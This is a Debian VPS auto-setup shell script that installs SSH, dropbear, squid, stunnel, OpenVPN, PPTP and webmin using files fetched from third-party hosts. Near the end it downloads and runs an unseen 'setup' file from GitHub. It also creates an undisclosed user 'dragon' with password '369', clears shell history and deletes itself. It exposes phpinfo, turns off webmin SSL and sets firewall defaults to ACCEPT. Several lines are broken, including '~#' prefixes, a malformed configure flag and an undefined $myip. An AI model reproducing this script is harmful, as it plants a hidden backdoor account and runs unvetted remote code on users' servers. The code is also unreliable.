#!/bin/sh
# Created by https://www.borneovpshosting.com
# Modified by OrangKuatSabahanTerkini

#Requirement
if [ ! -e /usr/bin/curl ]; then
    apt-get -y update && apt-get -y upgrade
	apt-get -y install curl
fi
# initializing var
export DEBIAN_FRONTEND=noninteractive
OS=`uname -m`;
MYIP=$(curl -4 icanhazip.com)
if [ $MYIP = "" ]; then
   MYIP=`ifconfig | grep 'inet addr:' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | cut -d: -f2 | awk '{ print $1}' | head -1`;
fi
MYIP2="s/xxxxxxxxx/$MYIP/g";

#vps="zvur";
vps="aneka";

#if [[ $vps = "zvur" ]]; then
	#source="http://"
#else
	source="http://vps.keningau-panel.xyz/debian8"
#fi

# go to root
cd

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local

#Add DNS Server ipv4
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 8.8.4.4" >> /etc/resolv.conf
sed -i '$ i\echo "nameserver 8.8.8.8" > /etc/resolv.conf' /etc/rc.local
sed -i '$ i\echo "nameserver 8.8.4.4" >> /etc/resolv.conf' /etc/rc.local

# install wget and curl
apt-get update;apt-get -y install wget curl;

# set time GMT +8
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime

# set repo
cat > /etc/apt/sources.list <<END2
deb http://security.debian.org/ jessie/updates main contrib non-free
deb-src http://security.debian.org/ jessie/updates main contrib non-free
deb http://http.us.debian.org/debian jessie main contrib non-free
deb http://packages.dotdeb.org jessie all
deb-src http://packages.dotdeb.org jessie all
END2
wget "http://www.dotdeb.org/dotdeb.gpg"
cat dotdeb.gpg | apt-key add -;rm dotdeb.gpg

# remove unused
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove bind9*;
apt-get -y purge sendmail*
apt-get -y remove sendmail*

# update
apt-get update; apt-get -y upgrade;

# install webserver
apt-get -y install nginx php5-fpm php5-cli

# install essential package
echo "mrtg mrtg/conf_mods boolean true" | debconf-set-selections
apt-get -y install bmon iftop htop nmap axel nano iptables traceroute sysv-rc-conf dnsutils bc nethogs openvpn vnstat less screen psmisc apt-file whois ptunnel ngrep mtr git zsh mrtg snmp snmpd snmp-mibs-downloader unzip unrar rsyslog debsums rkhunter
apt-get -y install build-essential
apt-get -y install libio-pty-perl libauthen-pam-perl apt-show-versions

# disable exim
service exim4 stop
sysv-rc-conf exim4 off

# update apt-file
apt-file update

# setting vnstat
vnstat -u -i eth0
service vnstat restart

#text gambar
#apt-get install boxes

# text pelangi
#sudo apt-get install ruby
#sudo gem install lolcat

# text warna
#cd
#rm -rf /root/.bashrc
#wget -O /root/.bashrc $source/.bashrc

# Install Webserver Port 81
apt-get install nginx php5 libapache2-mod-php5 php5-fpm php5-cli php5-mysql php5-mcrypt libxml-parser-perl -y
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
mv /etc/nginx/nginx.conf /etc/nginx/nginx.conf.old
curl $source/nginx.conf > /etc/nginx/nginx.conf
curl $source/vps.conf > /etc/nginx/conf.d/vps.conf
sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
useradd -m vps;
mkdir -p /home/vps/public_html
echo "<?php phpinfo() ?>" > /home/vps/public_html/info.php
chown -R www-data:www-data /home/vps/public_html
chmod -R g+rw /home/vps/public_html
cd /home/vps/public_html
wget -O /home/vps/public_html/uptime.php "http://autoscript.kepalatupai.com/uptime.php1"
wget -O /home/vps/public_html/index.html "http://facebook.com/mr.shandarez"
service php5-fpm restart
service nginx restart

# update zLib
~# wget "$source/zlib-1.2.11.tar.gz"
~# tar -xf zlib-1.2.11.tar.gz
~# cd zlib-1.2.11
~# ./configure --prefix=/usr ----sysconfdir=/usr/include && make && make install

# update OpenSSL
wget "$source/openssl-1.1.0f.tar.gz"
tar -xf openssl-1.1.0f.tar.gz
cd openssl-1.1.0f
./configure --prefix=/usr --sysconfdir=/etc/ssl --libdir=lib && make && make test && make install
make MANSUFFIX=ssl install && mv -v /usr/share/doc/openssl{,-1.1.0f} && cp -vfr doc/* /usr/share/doc/openssl-1.1.0f

# update OpenSSH
wget "$source/openssh-7.5p1-openssl-1.1.0-1.patch"
wget "$source/openssh-7.5p1.tar.gz"
tar -xf openssh-7.5p1.tar.gz
cd openssh-7.5p1
patch -Np1 -i ../openssh-7.5p1-openssl-1.1.0-1.patch && ./configure --prefix=/usr --sysconfdir=/etc/ssh --with-md5-passwords && make && make install
# configure ssh
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
sed -i 's/Port 22/Port 22/g' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 2020' /etc/ssh/sshd_config

# install dropbear
apt-get -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 109 -p 110"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
service dropbear restart
service ssh restart

#Upgrade to Dropbear 2018
cd
apt-get install zlib1g-dev
wget $source/dropbear-2018.76.tar.bz2
bzip2 -cd dropbear-2018.76.tar.bz2 | tar xvf -
cd dropbear-2018.76
./configure
make && make install
mv /usr/sbin/dropbear /usr/sbin/dropbear.old
ln /usr/local/sbin/dropbear /usr/sbin/dropbear
cd && rm -rf dropbear-2018.76 && rm -rf dropbear-2018.76.tar.bz2
service dropbear restart

# install vnstat gui
cd /home/vps/public_html/
wget $source/vnstat_php_frontend-1.5.1.tar.gz
tar xf vnstat_php_frontend-1.5.1.tar.gz
rm vnstat_php_frontend-1.5.1.tar.gz
mv vnstat_php_frontend-1.5.1 vnstat
cd vnstat
sed -i "s/\$iface_list = array('eth0', 'sixxs');/\$iface_list = array('eth0');/g" config.php
sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
sed -i 's/Internal/Internet/g' config.php
sed -i '/SixXS IPv6/d' config.php
cd

# install fail2ban
apt-get update;apt-get -y install fail2ban;service fail2ban restart;

# Instal (D)DoS Deflate
if [ -d '/usr/local/ddos' ]; then
	echo; echo; echo "Please un-install the previous version first"
	exit 0
else
	mkdir /usr/local/ddos
fi
clear
echo; echo 'Installing DOS-Deflate 0.6'; echo
echo; echo -n 'Downloading source files...'
wget -q -O /usr/local/ddos/ddos.conf http://www.inetbase.com/scripts/ddos/ddos.conf
echo -n '.'
wget -q -O /usr/local/ddos/LICENSE http://www.inetbase.com/scripts/ddos/LICENSE
echo -n '.'
wget -q -O /usr/local/ddos/ignore.ip.list http://www.inetbase.com/scripts/ddos/ignore.ip.list
echo -n '.'
wget -q -O /usr/local/ddos/ddos.sh http://www.inetbase.com/scripts/ddos/ddos.sh
chmod 0755 /usr/local/ddos/ddos.sh
cp -s /usr/local/ddos/ddos.sh /usr/local/sbin/ddos
echo '...done'
echo; echo -n 'Creating cron to run script every minute.....(Default setting)'
/usr/local/ddos/ddos.sh --cron > /dev/null 2>&1
echo '.....done'
echo; echo 'Installation has completed.'
echo 'Config file is at /usr/local/ddos/ddos.conf'
echo 'Please send in your comments and/or suggestions to zaf@vsnl.com'

# install squid3
apt-get -y install squid3
cat > /etc/squid3/squid.conf <<-END
acl localhost src 127.0.0.1/32 ::1
acl to_localhost dst 127.0.0.0/8 0.0.0.0/32 ::1
acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 21
acl Safe_ports port 443
acl Safe_ports port 70
acl Safe_ports port 210
acl Safe_ports port 1025-65535
acl Safe_ports port 280
acl Safe_ports port 488
acl Safe_ports port 591
acl Safe_ports port 777
acl CONNECT method CONNECT
acl SSH dst xxxxxxxxx-xxxxxxxxx/32
http_access allow SSH
http_access allow manager localhost
http_access deny manager
http_access allow localhost
http_access deny all
http_port 8888
http_port 8080
http_port 8000
http_port 80
http_port 3128
coredump_dir /var/spool/squid3
refresh_pattern ^ftp: 1440 20% 10080
refresh_pattern ^gopher: 1440 0% 1440
refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
refresh_pattern . 0 20% 4320
visible_hostname daybreakersx
END
sed -i $MYIP2 /etc/squid3/squid.conf;
service squid3 restart

# install stunnel4
apt-get -y install stunnel4
wget -O /etc/stunnel/stunnel.pem "$source/stunnel.pem"
wget -O /etc/stunnel/stunnel.conf "$source/stunnel.conf"
sed -i $MYIP2 /etc/stunnel/stunnel.conf
sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
service stunnel4 restart

# install webmin
cd
wget "https://prdownloads.sourceforge.net/webadmin/webmin_1.881_all.deb"
dpkg --install webmin_1.881_all.deb;
apt-get -y -f install;
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
rm /root/webmin_1.881_all.deb
service webmin restart
service vnstat restart

#install PPTP
apt-get -y install pptpd
cat > /etc/ppp/pptpd-options <<END
name pptpd
refuse-pap
refuse-chap
refuse-mschap
require-mschap-v2
require-mppe-128
ms-dns 8.8.8.8
ms-dns 8.8.4.4
proxyarp
nodefaultroute
lock
nobsdcomp
END

cat > /etc/pptpd.conf <<END
option /etc/ppp/pptpd-options
logwtmp
localip 10.1.0.1
remoteip 10.1.0.5-100
END

cat >> /etc/ppp/ip-up <<END
ifconfig ppp0 mtu 1400
END
mkdir /var/lib/premium-script
/etc/init.d/pptpd restart

# install mrtg
wget -O /etc/snmp/snmpd.conf "$source/snmpd.conf"
wget -O /root/mrtg-mem.sh "$source/mrtg-mem.sh"
chmod +x /root/mrtg-mem.sh
cd /etc/snmp/
sed -i 's/TRAPDRUN=no/TRAPDRUN=yes/g' /etc/default/snmpd
service snmpd restart
snmpwalk -v 1 -c public localhost 1.3.6.1.4.1.2021.10.1.3.1
mkdir -p /home/vps/public_html/mrtg
cfgmaker --zero-speed 100000000 --global 'WorkDir: /home/vps/public_html/mrtg' --output /etc/mrtg.cfg public@localhost
curl "$source/mrtg.conf" >> /etc/mrtg.cfg
sed -i 's/WorkDir: \/var\/www\/mrtg/# WorkDir: \/var\/www\/mrtg/g' /etc/mrtg.cfg
sed -i 's/# Options\[_\]: growright, bits/Options\[_\]: growright/g' /etc/mrtg.cfg
indexmaker --output=/home/vps/public_html/mrtg/index.html /etc/mrtg.cfg
if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
cd

# openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget $source/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/iptables.up.rules "$source/iptables.up.rules"
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
iptables-restore < /etc/iptables.up.rules
# etc
wget -O /home/vps/public_html/client.ovpn "$source/client.ovpn"
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
cd;wget $source/cronjob.tar
tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash dragon
echo "dragon:369" | chpasswd
echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
clear

#Setting USW
apt-get install ufw
ufw allow ssh
ufw allow 1194/tcp
sed -i 's|DEFAULT_INPUT_POLICY="DROP"|DEFAULT_INPUT_POLICY="ACCEPT"|' /etc/default/ufw
sed -i 's|DEFAULT_FORWARD_POLICY="DROP"|DEFAULT_FORWARD_POLICY="ACCEPT"|' /etc/default/ufw
cat > /etc/ufw/before.rules <<-END
# START OPENVPN RULES
# NAT table rules
*nat
:POSTROUTING ACCEPT [0:0]
# Allow traffic from OpenVPN client to eth0
-A POSTROUTING -s 10.8.0.0/8 -o eth0 -j MASQUERADE
COMMIT
# END OPENVPN RULES
END
ufw enable
ufw status
ufw disable

# set ipv4 forward
echo 1 > /proc/sys/net/ipv4/ip_forward
sed -i 's|#net.ipv4.ip_forward=1|net.ipv4.ip_forward=1|' /etc/sysctl.conf

# Install BadVPN
apt-get -y install cmake make gcc
wget $source/badvpn-1.999.127.tar.bz2
tar xf badvpn-1.999.127.tar.bz2
mkdir badvpn-build
cd badvpn-build
cmake ~/badvpn-1.999.127 -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_UDPGW=1
make install
screen badvpn-udpgw --listen-addr 127.0.0.1:7300 > /dev/null &
cd

# SSH brute-force protection
iptables -A INPUT -p tcp --dport ssh -m conntrack --ctstate NEW -m recent --set 
iptables -A INPUT -p tcp --dport ssh -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 10 -j DROP  

# Protection against port scanning
iptables -N port-scanning 
iptables -A port-scanning -p tcp --tcp-flags SYN,ACK,FIN,RST RST -m limit --limit 1/s --limit-burst 2 -j RETURN 
iptables -A port-scanning -j DROP


# setting banner
rm /etc/issue.net
wget -O /etc/issue.net "$source/issue.net"
sed -i 's@#Banner@Banner@g' /etc/ssh/sshd_config
sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/issue.net"@g' /etc/default/dropbear
service ssh restart
service dropbear restart

# download script
cd
wget https://raw.githubusercontent.com/sslmode/123/master/setup
chmod +x setup
./setup

# Finishing
wget -O /etc/vpnfix.sh $source/vpnfix.sh
chmod 777 /etc/vpnfix.sh
sed -i 's/exit 0//g' /etc/rc.local
echo "" >> /etc/rc.local
echo "bash /etc/vpnfix.sh" >> /etc/rc.local
echo "$ screen badvpn-udpgw --listen-addr 127.0.0.1:7300 > /dev/null &" >> /etc/rc.local
echo "nohup ./cron.sh &" >> /etc/rc.local
echo "exit 0" >> /etc/rc.local

# finalizing
apt-get -y autoremove
chown -R www-data:www-data /home/vps/public_html
service nginx start
service php5-fpm start
service vnstat restart
service openvpn restart
service snmpd restart
service ssh restart
service dropbear restart
service fail2ban restart
service squid3 restart
service webmin restart
service pptpd restart
sysv-rc-conf rc.local on

#clearing history
history -c


# info
clear
echo " "
echo "################################################################################" | lolcat
echo "#          SELAMAT DATANG DI SCRIPT AUTO SETUP VPS BY VPSPROJECT.              #" | lolcat
echo "#                       SCRIPT VERSION V2.0 FOR DEBIAN 7-8-9                   #" | lolcat
echo "#                               SEMOGA BERMANFAAT                              #" | lolcat
echo "#------------------------------------------------------------------------------#" | lolcat
echo "################################################################################" | lolcat
echo "============================================================" | tee -a log-install.txt| lolcat
echo " FINSIH AND THANK YOU / Please Restart You VPS     "| tee -a log-install.txt| lolcat
echo "============================================================" | tee -a log-install.txt| lolcat
echo "Service :" | tee -a log-install.txt | lolcat
echo "---------" | tee -a log-install.txt | lolcat
echo "OpenSSH  : 22, 143" | tee -a log-install.txt | lolcat
echo "Dropbear : 442 ,109,442" | tee -a log-install.txt | lolcat
echo "  SSL    : 443, 80" | tee -a log-install.txt | lolcat
echo "Squid3   : 8080 limit to IP $MYIP" | tee -a log-install.txt | lolcat
#echo "OpenVPN  : TCP 1194 (client config : http://$MYIP:81/client.ovpn)" | tee -a log-install.txt | lolcat
echo "badvpn   : badvpn-udpgw port 7300" | tee -a log-install.txt | lolcat
echo "PPTP VPN : TCP 1723" | tee -a log-install.txt | lolcat
echo "nginx    : 81" | tee -a log-install.txt | lolcat
echo "" | tee -a log-install.txt | lolcat
echo "Tools :" | tee -a log-install.txt | lolcat
echo "axel, bmon, htop, iftop, mtr, rkhunter, nethogs: nethogs $ether" | tee -a log-install.txt | lolcat
echo "Script :" | tee -a log-install.txt | lolcat
echo "--------" | tee -a log-install.txt | lolcat
echo "" | tee -a log-install.txt
echo "Fitur lain :" | tee -a log-install.txt | lolcat
echo "------------" | tee -a log-install.txt | lolcat
echo "Webmin         : http://$MYIP:10000/" | tee -a log-install.txt | lolcat
echo "vnstat         : http://$MYIP:81/vnstat/ [Cek Bandwith]" | tee -a log-install.txt | lolcat
echo "MRTG           : http://$MYIP:81/mrtg/" | tee -a log-install.txt | lolcat
echo "Timezone       : Asia/Jakarta " | tee -a log-install.txt | lolcat
echo "Fail2Ban       : [on]" | tee -a log-install.txt | lolcat
echo "DDoS Deflate.  : [on]" | tee -a log-install.txt | lolcat
echo "Block Torrent  : [on]" | tee -a log-install.txt | lolcat
echo "IPv6           : [on]" | tee -a log-install.txt | lolcat
echo "Auto Lock User Expire tiap jam 00:00" | tee -a log-install.txt | lolcat
echo "Auto Reboot tiap jam 00:00 dan jam 12:00" | tee -a log-install.txt | lolcat
echo "Credit to all developers script, VpsProject" | tee -a log-install.txt | lolcat
echo "THANK YOU FOR CHOICE US!!" | tee -a log-install.txt | lolcat
echo "" | tee -a log-install.txt | lolcat
echo " !!! SILAHKAN REBOOT VPS ANDA !!!" | tee -a log-install.txt | lolcat
echo "=======================================================" | tee -a log-install.txt | lolcat
rm -f /root/debian8
